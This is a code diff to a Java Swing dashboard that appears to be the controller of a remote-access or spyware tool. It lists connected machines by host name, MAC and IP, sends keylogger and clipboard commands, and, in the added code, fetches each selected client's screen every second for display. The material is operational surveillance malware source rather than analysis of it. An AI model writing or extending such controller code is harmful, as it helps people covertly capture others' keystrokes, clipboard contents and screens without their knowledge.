@@ -2,19 +2,21 @@ package swing;
 
 import admin.Admin;
 import models.SystemInfoModel;
+import swing.ContextMenu.test;
 import swing.button.ButtonCustom;
+import swing.notification.Notification;
 import swing.progressbar.ProgressBarCustom;
 import swing.table.TableCustom;
 import utils.console;
 
 import javax.swing.*;
+import javax.swing.border.EmptyBorder;
 import javax.swing.event.ListSelectionEvent;
 import javax.swing.event.ListSelectionListener;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.io.IOException;
 
 import static utils.Command.*;
 
@@ -32,12 +34,10 @@ public class DashboardGUI extends JFrame {
     private ButtonCustom buttonCustom1;
     private JPanel right;
     private JPanel left;
-    private JPanel center;
     private JLabel lbl_title_disk;
     private JLabel lbl_title_ram;
     private JLabel lbl_title_cpu;
     private JLabel lbl_title_uuid;
-    private JLabel lbl_uuid;
     private JLabel lbl_cpu;
     private JLabel lbl_ram;
     private JLabel lbl_disk;
@@ -55,19 +55,49 @@ public class DashboardGUI extends JFrame {
     private JTextArea txt_area_keylogger;
     private ButtonCustom btn_clipboard;
     private ButtonCustom btn_keylogger;
+    private JTextField txt_id;
+    private JTextField txt_cpu;
+    private JTextField txt_ram;
+    private JTextField txt_disk;
+    private JTextField txt_ip;
 
     private static DefaultTableModel defaultTableModel = new DefaultTableModel();
     private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
     private String currentClientId;
-
+    private static Notification panel;
     public DashboardGUI() throws Exception {
         (admin = new Admin(this)).start();
         this.initFrame();
+        panel = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER, "Client has disconnect!");
+        txt_id.setBorder(new EmptyBorder(0,0,0,0));
+        txt_cpu.setBorder(new EmptyBorder(0,0,0,0));
+        txt_ram.setBorder(new EmptyBorder(0,0,0,0));
+        txt_disk.setBorder(new EmptyBorder(0,0,0,0));
+        txt_ip.setBorder(new EmptyBorder(0,0,0,0));
         jscrollpane.setPreferredSize(new Dimension( 600 , 500));
         table.setModel(defaultTableModel);
         TableCustom.apply(jscrollpane, TableCustom.TableType.MULTI_LINE);
         ImageIcon imageIcon = new ImageIcon(new ImageIcon("/test4.jpg").getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH));
         this.lbl_image.setIcon(imageIcon);
+    }
+
+    public void sync() {
+        panel.setMessageText(String.format("Client [%s] has disconnected!", currentClientId.substring(0, currentClientId.length()/2)));
+        int rowCount = defaultTableModel.getRowCount();
+        for (int i = rowCount - 1; i >= 0; i--) {
+            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
+        }
+        currentClientId = null;
+        panel.showNotification();
+        txt_id.setText(null);
+        txt_cpu.setText(null);
+        txt_ram.setText(null);
+        txt_disk.setText(null);
+        txt_ip.setText(null);
+        pgb_cpu.setValue(0);
+        pgb_ram.setValue(0);
+        pgb_disk.setValue(0);
+        txt_area_keylogger.setText(null);
     }
 
     private void initFrame() throws InterruptedException {
@@ -105,11 +135,11 @@ public class DashboardGUI extends JFrame {
                 }
                 currentClientId = (String) table.getValueAt(selectedRow, 0);
                 SystemInfoModel client = admin.getClients().get(currentClientId);
-//                lbl_uuid.setText(currentClientId);
-                lbl_ram.setText(client.getRam());
-                lbl_disk.setText(client.getDisk());
-                lbl_cpu.setText(client.getCpu());
-                lbl_ip.setText(client.getIp());
+                txt_id.setText(currentClientId);
+                txt_ram.setText(client.getRam());
+                txt_disk.setText(client.getDisk());
+                txt_cpu.setText(client.getCpu());
+                txt_ip.setText(client.getIp());
 
                 console.info("[CURRENT CLIENT] " + currentClientId);
             }
@@ -132,12 +162,14 @@ public class DashboardGUI extends JFrame {
                 admin.onHandle(COMMAND_KEYLOGGER);
             }
         });
+
         test.addDefaultContextMenu(txt_area_keylogger);
         /**
          * Threading config
          */
         new Thread(this::fetch).start();
         new Thread(this::monitoring).start();
+        new Thread(this::screen).start();
     }
 
     public void monitoring() {
@@ -176,6 +208,23 @@ public class DashboardGUI extends JFrame {
         }
     }
 
+    public void screen() {
+        while (true) {
+            console.warn("SCREEN FETCHING...");
+            try {
+                if (currentClientId != null) {
+                    admin.onHandle(COMMAND_CLIENT_SCREEN);
+                }
+                Thread.currentThread().sleep(1000);
+            } catch (InterruptedException e) {
+                e.getStackTrace();
+                throw new RuntimeException(e);
+            }
+        }
+    }
+    public void updateClientScreen(ImageIcon imageIcon) {
+        lbl_image.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH)));
+    }
     public void updateProgressBar(int cpu, int ram, int disk) {
         this.pgb_cpu.setValue(cpu);
         this.pgb_ram.setValue(ram);
